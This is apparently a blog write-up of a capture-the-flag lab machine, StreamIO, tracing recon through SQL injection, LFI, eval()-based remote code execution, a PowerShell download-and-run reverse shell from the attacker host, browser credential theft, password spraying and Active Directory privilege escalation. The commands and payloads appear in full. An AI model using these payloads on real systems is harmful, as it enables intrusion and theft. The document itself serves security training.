---
layout: post
title: "streamio"
date: 2025-10-14 
categories: OSCP Playlist
---
# streamIO

# Summary

- Fuzzing with ffuf to find privileged /admin dir
- nmap scan reveal subdomain, confirmed with ffuf
- subdomain has a search function; vulnerable to SQL injection
- SQLi to get credentials to main web page login
- fuzz http parameters to get hidden debug parameter
- LFI in debug parameter; use php filter to read index.php and master.php source code
- source code reveal vulnerable use of include() and eval() function, over a POST parameter include
- force web to point to our host, where we host a ConPTYshell to get foothold on machine
- use credential for MSSQL revealed in earlier source code to login
- found nikk37 user’s password; allow PSRemote; login with evil-winrm
- found Firefox in AppData, extract passwords from logins.json and key4.db; extract with firepwd.py; reveal more credentials
- nxc to password spray passwords against users; reveal credential for JDgodd
- bloodhound to map AD; JDgodd owns Group Core Staff, which have LAPSReadPassword privilege
- Get-ADGroup to read distinguished group; impacket-dacledit to grant permission to add group; bloodyad to add JDgodd to Core Staff
- nxc to read LAPS password
- login as Administrator with evil-winrm

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/streamio 10.10.11.158

53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-14 22:57:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_ssl-date: 2025-10-14T22:58:14+00:00; +7h00m04s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## SMB null

This looks to be a domain controller, we see the domain names, let’s add that to our /etc/hosts:

```bash
10.10.11.158 streamIO.htb watch.streamIO.htb
```

Let’s see if null authentication is enabled for smb:

```bash
nxc smb 10.10.11.158 -u 'any' -p '' --shares

SMB         10.10.11.158    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] streamIO.htb\any: STATUS_LOGON_FAILURE 

smbclient -N -L //10.10.11.158

session setup failed: NT_STATUS_ACCESS_DENIED

```

We get the hostname DC, but null authentication disabled.

## DNS zone transfer

Let’s attempt a zone transfer and get a subdomain:

```bash
dig axfr streamIO.htb @10.10.11.158

; <<>> DiG 9.20.11-4+b1-Debian <<>> axfr stream.io @10.10.11.158
;; global options: +cmd
; Transfer failed.

dig axfr watch.streamIO.htb @10.10.11.158

; <<>> DiG 9.20.11-4+b1-Debian <<>> axfr watch.streamIO.htb @10.10.11.158
;; global options: +cmd
; Transfer failed.
```

## ldapsearch

Let’s use ldapsearch to attempt null bind:

```bash
ldapsearch -x -H ldap://10.10.11.158 -s base -b "" namingContexts
```

Rejected.

## Web

### HTTP port 80

Let’s visit the web page:

![image.png]({{ site.baseurl }}/assets/streamio/image.png)

Default IIS page.

![image.png]({{ site.baseurl }}/assets/streamio/image%201.png)

Nothing in the page source either.

Let’s fuzz for subdomains:

```bash
ffuf -u http://10.10.11.158 -H "Host: FUZZ.streamIO.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 703
```

No result.

Let’s fuzz for subdir:

```bash
feroxbuster -u http://10.10.11.158 -C 404

404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      157c http://10.10.11.158/aspnet_client => http://10.10.11.158/aspnet_client/
200      GET      334l     2089w   180418c http://10.10.11.158/iisstart.png
200      GET       32l       55w      703c http://10.10.11.158/
301      GET        2l       10w      157c http://10.10.11.158/Aspnet_client => http://10.10.11.158/Aspnet_client/
301      GET        2l       10w      157c http://10.10.11.158/aspnet_Client => http://10.10.11.158/aspnet_Client/
301      GET        2l       10w      168c http://10.10.11.158/aspnet_client/system_web => http://10.10.11.158/aspnet_client/system_web/
301      GET        2l       10w      157c http://10.10.11.158/ASPNET_CLIENT => http://10.10.11.158/ASPNET_CLIENT/
301      GET        2l       10w      168c http://10.10.11.158/Aspnet_client/system_web => http://10.10.11.158/Aspnet_client/system_web/
400      GET        6l       26w      324c http://10.10.11.158/error%1F_log
400      GET        6l       26w      324c http://10.10.11.158/aspnet_client/error%1F_log
301      GET        2l       10w      168c http://10.10.11.158/aspnet_Client/system_web => http://10.10.11.158/aspnet_Client/system_web/
```

Nothing.

### HTTPS port 443

Let’s visit HTTPS:

![image.png]({{ site.baseurl }}/assets/streamio/image%202.png)

![image.png]({{ site.baseurl }}/assets/streamio/image%203.png)

Clicking on home tells us that the web page is served with php:

![image.png]({{ site.baseurl }}/assets/streamio/image%204.png)

![image.png]({{ site.baseurl }}/assets/streamio/image%205.png)

About Us page gives us potential users.

![image.png]({{ site.baseurl }}/assets/streamio/image%206.png)

Email syntax seems to be firstname@Streamio.htb

There is also a contact function on contact.php page:

![image.png]({{ site.baseurl }}/assets/streamio/image%207.png)

![image.png]({{ site.baseurl }}/assets/streamio/image%208.png)

There is also a login function:

![image.png]({{ site.baseurl }}/assets/streamio/image%209.png)

Let’s try default credential admin:admin. Failed. There is an option to register. Let’s do that:

![image.png]({{ site.baseurl }}/assets/streamio/image%2010.png)

![image.png]({{ site.baseurl }}/assets/streamio/image%2011.png)

Let’s login. However it failed. First the hyperlink directing us back to the login page is incorrect:

![image.png]({{ site.baseurl }}/assets/streamio/image%2012.png)

Then, we we try to login with the user we just created fails. When we try adding the email format, we get an error Bad Characters:

![image.png]({{ site.baseurl }}/assets/streamio/image%2013.png)

The login is also not vulnerable to SQLi:

```bash
' OR '1'='1'-- -
```

Let’s fuzz for subdir:

```bash
feroxbuster -u https://streamio.htb -k -C 404
```

Let’s fuzz for subdir and php files:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u https://streamio.htb/FUZZ -ic -e .php

index.php               [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 20ms]                                                    
images                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 22ms]                                                           
about.php               [Status: 200, Size: 7825, Words: 2228, Lines: 231, Duration: 26ms]                                                     
contact.php             [Status: 200, Size: 6434, Words: 2010, Lines: 206, Duration: 49ms]                                                     
register.php            [Status: 200, Size: 4500, Words: 905, Lines: 121, Duration: 23ms]                                                      
login.php               [Status: 200, Size: 4145, Words: 796, Lines: 111, Duration: 40ms]                                                      
Images                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 16ms]                                                           
admin                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 18ms]                                                           
css                     [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 20ms]                                                           
Contact.php             [Status: 200, Size: 6434, Words: 2010, Lines: 206, Duration: 18ms]                                                     
About.php               [Status: 200, Size: 7825, Words: 2228, Lines: 231, Duration: 33ms]                                                     
Index.php               [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 19ms]                                                    
Login.php               [Status: 200, Size: 4145, Words: 796, Lines: 111, Duration: 19ms]                                                      
js                      [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 16ms]                                                           
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 18ms]                                                             
Register.php            [Status: 200, Size: 4500, Words: 905, Lines: 121, Duration: 20ms]                                                      
fonts                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 18ms]                                                           
IMAGES                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 15ms]                                                           
INDEX.php               [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 19ms]                                                    
Fonts                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 17ms]                                                           
Admin                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 16ms]                                                           
CSS                     [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 16ms]                                                           
JS                      [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 18ms]                                                           
Logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 18ms]                                                             
CONTACT.php             [Status: 200, Size: 6434, Words: 2010, Lines: 206, Duration: 18ms]                        
                        [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 32ms]                                                    
ABOUT.php               [Status: 200, Size: 7825, Words: 2228, Lines: 231, Duration: 20ms]
```

We do not have permission to access /admin.

Let’s fuzz /admin more:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u https://streamio.htb//admin/FUZZ -ic -v -e .php

[Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 20ms]
| URL | https://streamio.htb//admin/master.php

```

master.php:

![image.png]({{ site.baseurl }}/assets/streamio/image%2014.png)

Let’s fuzz for subdomains:

```bash
ffuf -u https://10.10.11.158 -H "Host: FUZZ.streamio.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 116

watch
```

No additional subdomains were found. 

Let’s move on to the subdomain we found from nmap scan:

```bash
https://watch.streamio.htb
```

![image.png]({{ site.baseurl }}/assets/streamio/image%2015.png)

We can leave an email and a POST request would send our request to /:

![image.png]({{ site.baseurl }}/assets/streamio/image%2016.png)

Let’s fuzz for subdirectories:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u https://watch.streamio.htb/FUZZ -ic -v -e .php

[Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 2061ms]
| URL | https://watch.streamio.htb/search.php

[Status: 200, Size: 677, Words: 28, Lines: 20, Duration: 23ms]
| URL | https://watch.streamio.htb/blocked.php
    * FUZZ: blocked.php

```

Going on search.php:

![image.png]({{ site.baseurl }}/assets/streamio/image%2017.png)

There is a search function. It is probably fetching the result from a database. Let’s see if this is vulnerable to SQL injections.

Let’s first determine the number of columns this allows:

```bash
cn' UNION select 1-- -

#NO result
#We keep appending numbers until we get an output

cn' UNION select 1,2,3,4,5,6-- -
```

![image.png]({{ site.baseurl }}/assets/streamio/image%2018.png)

Now we know there are 6 columns, 2 and 3 shows, so we have to dump the db values there. Let’s enumerate the database now. First, enumerate the version:

```bash
cn' UNION select 1,@@version,3,4,5,6-- -
```

![image.png]({{ site.baseurl }}/assets/streamio/image%2019.png)

It’s MSSQL 2019.

Let’s see what databases are available:

```bash
cn' UNION SELECT 1,name,3,4,5,6 FROM sys.databases-- - 

```

![image.png]({{ site.baseurl }}/assets/streamio/image%2020.png)

The streamio_backup db looks interesting, let’s enumerate the tables:

```bash
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = 'ilfreight';

cn' UNION SELECT 1,TABLE_NAME,3,4,5,6 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = 'streamio_backup'-- - 

SELECT name FROM ilfreight.sys.tables;

cn' UNION SELECT 1,name,3,4,5,6 FROM streamio_backup.sys.tables-- - 

```

Nothing. weird. Let’s try another db:

```bash
cn' UNION SELECT 1,name,3,4,5,6 FROM STREAMIO.sys.tables-- - 
```

![image.png]({{ site.baseurl }}/assets/streamio/image%2021.png)

Let’s check out users:

```bash
cn' UNION SELECT 1,COLUMN_NAME ,3,4,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_CATALOG = 'STREAMIO' AND TABLE_NAME = 'users'-- - 

OR

cn' UNION SELECT 1,name,3,4,5,6 FROM STREAMIO.sys.columns WHERE object_id = OBJECT_ID('STREAMIO.dbo.users')-- -
```

![image.png]({{ site.baseurl }}/assets/streamio/image%2022.png)

Let’s output all the fields:

```bash
cn' UNION SELECT 1, CONCAT(is_staff, ' ',username, ' ', password),3,4,5,6 FROM STREAMIO.dbo.users-- -

```

```bash

0 admin 665a50ac9eaa781e4f7f04199db97a11
3
1 Alexendra 1c2b3d8270321140e5153f6637d3ee53
<SNIP>
3
1 William d62be0dc82071bccc1322d64ec5b6c51
3
1 yoshihide b779ba15cedfd22a023c4d8bcf5f2332

```

The two unusual usernames is admin and yoshihide, as all the rest are first names with the first letter being a capital letter. Let’s put the hashes into crackstation; they look like md5 hashes:

```bash
admin:paddpadd
yoshihide:66boysandgirls..
```

Let’s check our current user on the mssql db:

```bash
 	cn' UNION SELECT 1,user_name(),3,4,5,6-- -
 	
 	db_user
```

Let’s list our privileges:

```bash
cn' UNOIN SELECT 1,permission_name,3,4,5,6 FROM master..fn_my_permissions(null, ‘DATABASE’)-- -

cn' UNION SELECT 1,is_srvrolemember('sysadmin'),3,4,5,6-- -

0
```

We are not sysadmin.

Let’s now back to the home page and attempt to login:

We are logged in with yoshihide.

![image.png]({{ site.baseurl }}/assets/streamio/image%2023.png)

Nothing new here discovered. We remember the /admin directory where we don’t have permission to access. Let’s try accessing it again now that we are logged in:

![image.png]({{ site.baseurl }}/assets/streamio/image%2024.png)

When we click on one of the hyperlinks, we get returned an empty http parameter and output:

![image.png]({{ site.baseurl }}/assets/streamio/image%2025.png)

Let’s fuzz for other parameters; don’t forget our cookie, since this is a privileged search function, we can get our session ID from cookie editor:

![image.png]({{ site.baseurl }}/assets/streamio/image%2026.png)

```bash
ffuf -u https://streamio.htb/admin/?FUZZ= -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H 'Cookie: PHPSESSID=b10arkkc2eefi5ngo381v7kv6r' -fs 1678

debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 24ms]
movie                   [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 292ms]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 24ms]
user                    [Status: 200, Size: 2073, Words: 146, Lines: 63, Duration: 184ms]

```

We see new parameter debug.

Let’s see what it returns:

![image.png]({{ site.baseurl }}/assets/streamio/image%2027.png)

Let’s do an existing page: 

![image.png]({{ site.baseurl }}/assets/streamio/image%2028.png)

We get an error. Let’s try LFI; remember this has a Windows backend:

![image.png]({{ site.baseurl }}/assets/streamio/image%2029.png)

It works.

Let’s try using php base64 filters:

```bash
https://streamio.htb/admin/?debug=php://filter/read=convert.base64-encode/resource=index.php
```

![image.png]({{ site.baseurl }}/assets/streamio/image%2030.png)

Let’s copy the base64 encoding and decode it:

```bash
echo 'BASE64_CHUNK' | base64 -d > index.php

#INTERESTING FINDS:

$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

<SNIP>
			<?php
				if(isset($_GET['debug']))
				{
					echo 'this option is for developers only';
					if($_GET['debug'] === "index.php") {
						die(' ---- ERROR ----');
					} else {
						include $_GET['debug'];
					}
				}
				else if(isset($_GET['user']))
					require 'user_inc.php';
				else if(isset($_GET['staff']))
					require 'staff_inc.php';
				else if(isset($_GET['movie']))
					require 'movie_inc.php';
				else 
			?>
```

the function include loads and executes the specified file (e.g., ?debug=admin.php would include admin.php). This means if we can get the server to point to our hosted web server, maybe we can get the server to execute our php code. Let’s try to get a reverse shell.

First, let’s test if we can reach our server:

```bash
#on attack host
nc -lnvp 80

#on target; burp repeater:
/admin/?debug=http%3a//10.10.16.4/hello
```

It does not reach us. 

Let’s also check out master.php:

```bash
#INTERESTING FINDS
<form method="POST">
<input name="include" hidden>
</form>

<?php
if(isset($_POST['include']))
{
	if($_POST['include'] !== "index.php" ) 
		eval(file_get_contents($_POST['include']));
	else
		echo(" ---- ERROR ---- ");
}
?>

```

That means it:

- **Reads the contents** of the file specified in the `include` parameter.
- **Evaluates it as PHP code** directly in memory; **Effectively, this is arbitrary PHP code execution.**

Let’s try including master.php in our debug parameter, then point to our URL:

```bash
POST /admin/?debug=master.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=b10arkkc2eefi5ngo381v7kv6r
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

include=http%3a//10.10.16.4/hello
```

Response:

```bash
listening on [any] 80 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.158] 56161
GET /hello HTTP/1.0
Host: 10.10.16.4
Connection: close

```

It worked. Now let’s create our payload. Since eval() expects raw php code, we do not need our php tags; first, let’s test our a normal whoami

```bash
system("whoami");
```

Now let’s execute again. First host our listener:

```bash
python3 -m http.server 80
```

On burp repeater, our request:

![image.png]({{ site.baseurl }}/assets/streamio/image%2031.png)

The response:

![image.png]({{ site.baseurl }}/assets/streamio/image%2032.png)

Looks like it works. Let’s get a reverse shell now. Let’s use the ConPTY shell. Let’s also add the following at the end of the file in our conptyshell ps script:

```bash
Invoke-ConPtyShell 10.10.16.4 4444
```

Now start a listener:

```bash
stty raw -echo; (stty size; cat) | nc -lvnp 4444
```

And change our cmd.php script to the following:

```bash
system("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/conpty.ps1')");

```

Now start our listeners:

```bash
#on one terminal 
python3 -m http.server 80
```

Now let’s execute on our burp the same request as before:

![image.png]({{ site.baseurl }}/assets/streamio/image%2033.png)

We now have shell:

![image.png]({{ site.baseurl }}/assets/streamio/image%2034.png)

Let’s enumerate our privileges:

```bash
whomai /priv

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Nothing interesting.

We can’t go into other user’s dir either. Let’s upload SharpHound and map out the AD.

```bash
#on attack
python3 -m http.server 8001

#on target
cd C:\inetpub\temp
iwr http://10.10.16.4:8001/SharpHound.exe -OutFile sharphound.exe
```

Now let’s execute:

```bash
.\sharphound.exe -c all
```

To transfer back, let’s use a smb server:

```bash
#on attack
sudo impacket-smbserver share -smb2support . -user test -password test

#on target
net use \\10.10.16.4\share /user:test test
#Now we can just copy as normal
copy 20251015105944_BloodHound.zip \\10.10.16.4\share\bh.zip
```

Now let’s start bloodhound:

```bash
sudo neo4j start
bloodhound
```

We had to unzip the file first before uploading.

![image.png]({{ site.baseurl }}/assets/streamio/image%2035.png)

We also have the db_admin credential from before:

```bash
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
```

Let’s sign in:

```bash
sqlcmd -S localhost -U db_admin -P 'B1@hx31234567890' -y 30 -Y 30
```

We are in. Now let’s enumerate:

```bash
1> SELECT name FROM master.dbo.sysdatabases
2> go

------------------------------ 
master                         
tempdb                         
model
msdb
STREAMIO
streamio_backup

#Selecting a DB
1> USE streamio_backup
2> go

#Show tables
1> SELECT table_name FROM streamio.INFORMATION_SCHEMA.TABLES
2> go

table_name                     
------------------------------
movies
users

#Select all Data from Table "users"
1> SELECT * FROM users
2> go

id          username                       password                       
----------- ------------------------------ ------------------------------
          1 nikk37                         389d14cb8e4e9b94b137deb1caf061
          2 yoshihide                      b779ba15cedfd22a023c4d8bcf5f23
          3 James                          c660060492d9edcaa8332d89c99c92
          4 Theodore                       925e5408ecb67aea449373d668b735
          5 Samantha                       083ffae904143c4796e464dac33c1f
          6 Lauren                         08344b85b329d7efd611b7a7743e8a
          7 William                        d62be0dc82071bccc1322d64ec5b6c
          8 Sabrina                        f87d3c0d6c8fd686aacc6627f1f493

```

If we exit, and look at available users on the host, we see nikk37:

![image.png]({{ site.baseurl }}/assets/streamio/image%2036.png)

Let’s go on crackstation and see if the hash is crackable

![image.png]({{ site.baseurl }}/assets/streamio/image%2037.png)

```bash
get_dem_girls2@yahoo.com
```

And if we search up nikk37 on bloodhound, we see that he is a PSRemote user:

![image.png]({{ site.baseurl }}/assets/streamio/image%2038.png)

Let’s try evil-winrm with his account:

```bash
evil-winrm -u nikk37 -p 'get_dem_girls2@yahoo.com' -i 10.10.11.158
```

![image.png]({{ site.baseurl }}/assets/streamio/image%2039.png)

We are on. We see we do not have any additional privileges.

Let’s check the user’s powershell history:

```bash
type C:\Users\nikk37\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Nothing. Browsing around we do not see any unique binaries in the Program Files dir. Let’s check our AppData directory:

```bash
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hsl        2/22/2022   1:57 AM                Application Data
d--hsl        2/22/2022   1:57 AM                History
d-----        9/15/2018  12:19 AM                Microsoft
d-----        2/22/2022   2:40 AM                Mozilla
d-----       10/15/2025  11:42 AM                Temp
d--hsl        2/22/2022   1:57 AM                Temporary Internet Files
d-----        2/22/2022   2:42 AM                VirtualStore

```

We see Mozilla. Maybe there is firefox logins. 

We search up where to get the saved logins for firefox, we find:

https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data

```bash
cd C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release

dir

<SNIP>
-a----        2/22/2022   2:41 AM           2081 logins.json

```

Let’s download this back to our host and view it:

```bash
download logins.json
donwload key4.db
```

We find this tool by searching up decrypt firefox passwords. We need one where we can specify the directory:

[https://github.com/lclevy/firepwd](https://github.com/lclevy/firepwd)

Let’s download the script and try it out:

```bash
python3 -m venv myenv
source myenv/bin/activate

pip install -r requirements.txt

python firepwd.py -d .

clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'

```

Let’s use nxc to see which credentials are valid. First, put the users and passwords into two files, respectively. Now let’s run it:

```bash
nxc smb 10.10.11.158 -u users.txt -p pwds.txt --continue-on-success

SMB         10.10.11.158    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
```

We got a match with JDgodd. Let’s search this user up on bloodhound.

We have WriteOwner rights over Core Staff group:

![image.png]({{ site.baseurl }}/assets/streamio/image%2040.png)

And core staff, can read LAPS password; which is admin password:

![image.png]({{ site.baseurl }}/assets/streamio/image%2041.png)

Let’s write ourselves to this group. First we need to grant ourselves the AddMembers permission:

```bash
#Getting group distinguished name on target evil-winrm
Get-ADGroup -Identity "Core Staff" | Select-Object -ExpandProperty DistinguishedName

CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb

impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'JDgodd' -target-dn 'CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb' 'streamio.htb'/'JDgodd':'JDg0dd1s@d0p3cr3@t0r'

[*] DACL backed up to dacledit-20251015-082544.bak
[*] DACL modified successfully!
                               
```

Now let’s add ourselves to the group

```bash
bloodyAD -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.htb --host 10.10.11.158 add groupMember 'Core Staff' JDgodd

[+] JDgodd added to Core Staff

```

Now let’s read LAPS password:

```bash
nxc ldap 10.10.11.158 -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' -M laps

LAPS        10.10.11.158    389    DC               Computer:DC$ User:                Password:s7458M7AD]1!r0
```

Now, let’s evil-winrm as Administrator:

```bash
evil-winrm -u Administrator -p 's7458M7AD]1!r0' -i 10.10.11.158
```

We are now administrator on DC.